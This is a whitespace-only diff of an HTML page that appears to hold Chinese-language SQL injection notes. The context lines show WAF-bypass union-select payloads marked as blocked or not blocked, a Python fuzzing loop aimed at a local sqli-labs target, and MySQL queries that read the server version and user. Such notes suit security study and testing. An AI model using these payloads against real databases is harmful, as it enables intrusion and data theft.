@@ -185,7 +185,7 @@
 </code></pre></div></li>
 <li>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">/*!/*!*/</span>
-          
+
 <span style="color:#75715e"># 不拦截
 </span><span style="color:#75715e"></span><span style="color:#75715e">/*!union/*/</span><span style="color:#f92672">*/*%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">select</span><span style="color:#f92672">*/%</span><span style="color:#ae81ff">201</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span><span style="color:#f92672">--+</span>
 </code></pre></div></li>
@@ -201,7 +201,7 @@ union a%23 select 拦截
 union all%23 select 拦截
 union all%23%0a select 拦截
 union %23%0aall select 拦截
-          
+
 # 不拦截
 union%20%23%0aall%20/!*select*/
 </code></pre></li>
@@ -215,7 +215,7 @@ union%20%23%0aall%20/!*select*/
 <span style="color:#a6e22e">union</span>  <span style="color:#f92672">--</span> ()<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">select</span> <span style="color:#a6e22e">拦截</span>
 <span style="color:#a6e22e">union</span>  <span style="color:#f92672">--</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">select</span> <span style="color:#a6e22e">拦截</span>
 <span style="color:#a6e22e">union</span>  <span style="color:#f92672">--</span> <span style="color:#a6e22e">hex</span>()<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">a</span> <span style="color:#a6e22e">select</span> <span style="color:#a6e22e">拦截</span>
-          
+
 <span style="color:#a6e22e">union</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#f92672">--%</span><span style="color:#ae81ff">20</span><span style="color:#75715e">/*#*/</span><span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">aord</span>()<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span><span style="color:#a6e22e">a</span><span style="color:#f92672">%</span><span style="color:#ae81ff">20</span><span style="color:#a6e22e">select</span>
 </code></pre></div></li>
 </ul>
@@ -252,7 +252,7 @@ union%20%23%0aall%20/!*select*/
 <li>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
 <span style="color:#f92672">import</span> urllib
-        
+
 <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">177</span>):
     url <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#34;http://192.168.130.135/Less-1/?id=1</span><span style="color:#e6db74">%27%</span><span style="color:#e6db74">20xor%20{fuzz}updatexml{fuzz}(1,(select hex(user/**/(/**/))),1)--%20+&#34;</span><span style="color:#f92672">.</span>format(fuzz<span style="color:#f92672">=</span>urllib<span style="color:#f92672">.</span>quote(chr(i)))
     req <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
@@ -366,10 +366,10 @@ delete注入
 <li>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="color:#a6e22e">version</span>()
 <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#a6e22e">version</span>(),<span style="color:#ae81ff">3</span>;
-        
+
 <span style="color:#f92672">@@</span>version
 <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#f92672">@@</span>version,<span style="color:#ae81ff">3</span>;
-        
+
 <span style="color:#75715e">/*!版本号*/</span>  <span style="color:#960050;background-color:#1e0010">在</span>xxx版本之上执行
 <span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#66d9ef">select</span> <span style="color:#ae81ff">1</span>,<span style="color:#75715e">/*!50000 user()*/</span>,<span style="color:#ae81ff">3</span>;
 </code></pre></div></li>
@@ -396,11 +396,11 @@ delete注入
 <ul>
 <li>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-mysql" data-lang="mysql"><span style="color:#a6e22e">system_user</span>() <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">系统用户名</span>
-        
+
 <span style="color:#66d9ef">user</span>() <span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">用户名</span>
-        
+
 <span style="color:#66d9ef">current_user</span>()<span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">当前用户名</span>
-        
+
 <span style="color:#a6e22e">session_user</span>()<span style="color:#f92672">//</span><span style="color:#960050;background-color:#1e0010">链接数据库的用户名</span>
 </code></pre></div></li>
 </ul>
